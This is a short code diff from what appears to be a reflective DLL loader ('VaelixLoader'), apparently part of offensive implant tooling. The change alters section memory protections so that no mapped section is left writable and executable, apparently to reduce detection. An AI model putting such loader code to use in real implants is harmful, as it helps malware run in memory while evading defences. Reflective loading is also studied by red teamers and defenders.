@@ -104,13 +104,13 @@ DLLEXPORT VOID VaelixLoader( LPVOID lpParameter )
                 Protection = PAGE_EXECUTE;
 
             if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
-                Protection = PAGE_EXECUTE_WRITECOPY;
+                Protection = PAGE_EXECUTE_READ;
 
             if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                 Protection = PAGE_EXECUTE_READ;
 
             if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
-                Protection = PAGE_EXECUTE_READWRITE;
+                Protection = PAGE_EXECUTE_READ;
 
             Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
         }
